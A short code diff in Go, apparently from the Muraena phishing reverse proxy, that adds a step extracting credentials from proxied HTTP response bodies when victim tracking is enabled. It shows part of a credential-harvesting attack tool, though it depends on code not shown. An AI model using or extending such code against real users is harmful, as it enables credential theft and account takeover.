@@ -552,6 +552,21 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 		return err
 	}
 
+	// Extract credentials from response body
+	if muraena.Session.Config.Tracking.Enabled {
+		trace := muraena.Tracker.TrackResponse(response)
+		if trace.IsValid() {
+			found, err := trace.ExtractCredentialsFromResponseBody(string(responseBuffer), response)
+			if err != nil {
+				return errors.New(fmt.Sprintf("ExtractCredentialsFromResponseBody error: %s", err))
+			}
+
+			if found == true {
+				// muraena.Tracker.ShowVictims()
+			}
+		}
+	}
+
 	// process body and pack again
 	newBody := replacer.Transform(string(responseBuffer), false, base64)
 
